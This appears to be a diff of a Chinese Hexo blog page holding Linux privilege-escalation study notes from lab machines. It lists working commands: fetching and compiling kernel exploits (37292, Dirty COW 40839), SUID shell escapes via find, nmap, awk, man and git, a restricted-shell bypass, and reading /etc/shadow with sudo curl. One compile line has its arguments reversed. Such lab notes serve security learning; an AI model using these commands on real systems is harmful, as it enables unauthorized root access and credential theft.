@@ -102,12 +102,12 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipewkhf1zj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicivghyooj20zk0m8dir.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipevgoki5j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicivghyooj20zk0m8dir.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicm0n457cj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclfw2t96j20zk0m8x6p.jpg"></li>
         </ul>
       </div>
     </header>
@@ -154,7 +154,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <h2 id="linux提权笔记"><a class="markdownIt-Anchor" href="#linux提权笔记">#</a> linux 提权笔记</h2>
 <h4 id="利用内核漏洞提权"><a class="markdownIt-Anchor" href="#利用内核漏洞提权">#</a>  <code>利用内核漏洞提权</code></h4>
 <p>先开启一个可以交互的终端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br><span class="line">&#x2F;bin&#x2F;bash -i</span><br><span class="line">echo os.system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">/bin/bash -i</span><br><span class="line">echo os.system(&quot;/bin/bash&quot;);</span><br></pre></td></tr></table></figure>
 <p>发现靶机是低权限</p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409090920475.png" alt="image-20210409090920475"></p>
 <p>查看靶机内核，发现其版本为 Ubuntu 14.04.</p>
@@ -162,17 +162,17 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <p>打开 kali 查询可利用的 exploit，将其下载</p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409091229671.png" alt="image-20210409091229671"></p>
 <p>利用 python 将其传递到靶机上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8081</span><br><span class="line">python -m SimpleHTTPServer 8081</span><br><span class="line">靶机：wget http:&#x2F;&#x2F;IP:8081&#x2F;37292.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8081</span><br><span class="line">python -m SimpleHTTPServer 8081</span><br><span class="line">靶机：wget http://IP:8081/37292.c</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409091411379.png" alt="image-20210409091411379"></p>
 <p>将 exp 进行编译执行，成功获得 root 权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o 37292.c 37292</span><br><span class="line">.&#x2F;37292</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o 37292.c 37292</span><br><span class="line">./37292</span><br></pre></td></tr></table></figure>
 <h4 id="利用旧版本nmap提权"><a class="markdownIt-Anchor" href="#利用旧版本nmap提权">#</a>  <code>利用旧版本nmap提权</code></h4>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409095550386.png" alt="image-20210409091614007"></p>
 <p>nmap 支持 “interactive.” 选项，用户能够通过该选项执行 shell 命令，通常，安全人员会使用该命令来避免他们使用 nmap 命令被记录在 history 文件中</p>
 <p>查看可利用的提权 find /-perm -u=s 2&gt;/dev/null</p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409095637576.png" alt="image-20210409095550386"></p>
 <p>发现 nmap 存在提权漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用nmap --interactive </span><br><span class="line">!sh	成功提权</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用nmap --interactive </span><br><span class="line">!sh	成功提权</span><br></pre></td></tr></table></figure>
 <p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409091614007.png" alt="image-20210409095637576"></strong></p>
 <h4 id="环境变量提权"><a class="markdownIt-Anchor" href="#环境变量提权">#</a>  <code>环境变量提权</code></h4>
 <p>利用普通用户找到可执行文件，进行提权</p>
@@ -182,17 +182,17 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <p>使用 <code>uname -a</code>  命令查看 linux 内核信息，发现在脏牛漏洞范围内，可以进行测试。</p>
 <p>(需要 root 用户存在可执行文件)</p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210122091212588.png" alt="image-20210409102540192"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit dirty</span><br><span class="line">searchsploit -m 40839.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit dirty</span><br><span class="line">searchsploit -m 40839.c</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210122091605012.png" alt="image-20210410094828540"></p>
 <p>3. 将 exp 一下载到本地，使用 gcc -pthread dirty.c -o dirty -lcrypt` 命令对 dirty.c 进行编译，生成一个 dirty 的可执行文件。</p>
 <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 40839.c</span><br><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class="line">./40839</span><br><span class="line">等一会passwd文件会生成一个firefart用户</span><br><span class="line">su firefart (输入之前的密码,成功提权)</span><br></pre></td></tr></table></figure>
 <h4 id="find提权"><a class="markdownIt-Anchor" href="#find提权">#</a>  <code>find提权</code></h4>
 <p>(DC-01)</p>
 <p>先查找拥有 suid 权限的文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410094828540.png" alt="image-20210410095644313"></p>
 <p>进行提权</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch test.txt</span><br><span class="line">find &#x2F; -type f -name test.txt -exec &quot;whoami&quot; \; 发现是root权限</span><br><span class="line">find &#x2F; -type f -name test.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \; 成功提权</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch test.txt</span><br><span class="line">find / -type f -name test.txt -exec &quot;whoami&quot; \; 发现是root权限</span><br><span class="line">find / -type f -name test.txt -exec &quot;/bin/sh&quot; \; 成功提权</span><br></pre></td></tr></table></figure>
 <h4 id="git提权"><a class="markdownIt-Anchor" href="#git提权">#</a>  <code>git提权</code></h4>
 <p>(DC-02)</p>
 <p>寻找可用提权</p>
@@ -207,21 +207,21 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 </ul>
 <p>还可以用 BASH_CMDS [a]=/bin/sh;a 直接绕过</p>
 <p>或者更改环境变量，并查看 flag3.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a  注：把&#x2F;bin&#x2F;bash给a变量&#96;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;    注：将&#x2F;bin 作为PATH环境变量导出</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin   注：将&#x2F;usr&#x2F;bin作为PATH环境变量导出</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`</span><br><span class="line">export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出</span><br><span class="line">export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</span><br></pre></td></tr></table></figure>
 <p><strong>尝试 git 提权</strong>：可使用 sudo git help config 或者 sudo git -p help</p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410093844939.png" alt="image-20210410093833321"></p>
 <h4 id="sudo提权"><a class="markdownIt-Anchor" href="#sudo提权">#</a>  <code>sudo提权</code></h4>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果知道用户为空密码可以尝试sudo提权</span><br><span class="line">sudo -l， sudo su</span><br><span class="line">或者su root 尝试弱口令</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果知道用户为空密码可以尝试sudo提权</span><br><span class="line">sudo -l， sudo su</span><br><span class="line">或者su root 尝试弱口令</span><br></pre></td></tr></table></figure>
 <h4 id="awk提权"><a class="markdownIt-Anchor" href="#awk提权">#</a>  <code>awk提权</code></h4>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#39;BEGIN&#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
 <p>提权成功</p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410100702235.png" alt="image-20210410093844939"></p>
 <h4 id="man提权"><a class="markdownIt-Anchor" href="#man提权">#</a>  <code>man提权</code></h4>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410100730655.png" alt="image-20210410100740319"></p>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410100740319.png" alt="image-20210410100702235"></p>
 <h4 id="curl提权"><a class="markdownIt-Anchor" href="#curl提权">#</a>  <code>curl提权</code></h4>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl file:///etc/shadow</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410100812432.png" alt="image-20210410101229024"></p>
 <h4 id="crontab提权"><a class="markdownIt-Anchor" href="#crontab提权">#</a>  <code>crontab提权</code></h4>
 <p>cat /etc/crontab</p>
@@ -291,7 +291,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <div class="item left">
       
 
-  <a href="/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipetfk5zwj20zk0m8e81.jpg" title="内存取证">
+  <a href="/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeu1usa7j20zk0m8b29.jpg" title="内存取证">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>内存取证</h3>
@@ -301,7 +301,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <div class="item right">
       
 
-  <a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhtuo6nj20zk0m8ttm.jpg" title="Windows内核提权">
+  <a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4wqtg4j20zk0m8x6p.jpg" title="Windows内核提权">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>Windows内核提权</h3>
@@ -409,7 +409,16 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" title="Windows内核提权">Windows内核提权</a></span>
+    <span><a href="/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" title="meterpreter学习笔记">meterpreter学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" title="内存取证">内存取证</a></span>
   </li>
 
       
@@ -427,7 +436,7 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="upload-labs通关记录">upload-labs通关记录</a></span>
+    <span><a href="/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" title="Linux提权">Linux提权</a></span>
   </li>
 
       
@@ -445,7 +454,16 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" title="meterpreter学习笔记">meterpreter学习笔记</a></span>
+    <span><a href="/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="upload-labs通关记录">upload-labs通关记录</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" title="Windows内核提权">Windows内核提权</a></span>
   </li>
 
       
@@ -455,24 +473,6 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
 </div>
 
     <span><a href="/2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" title="paramiko模块介绍">paramiko模块介绍</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" title="Linux提权">Linux提权</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" title="内存取证">内存取证</a></span>
   </li>
 
   </ul>
@@ -497,13 +497,13 @@ Go Forward = 人生像攀登一座山，而找寻出路，却是一种学习的�
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">62k 字</span>
+    <span title="站点总字数">60k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">56 分钟</span>
+    <span title="站点阅读时长">55 分钟</span>
   </div>
   <div class="powered-by">
     基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
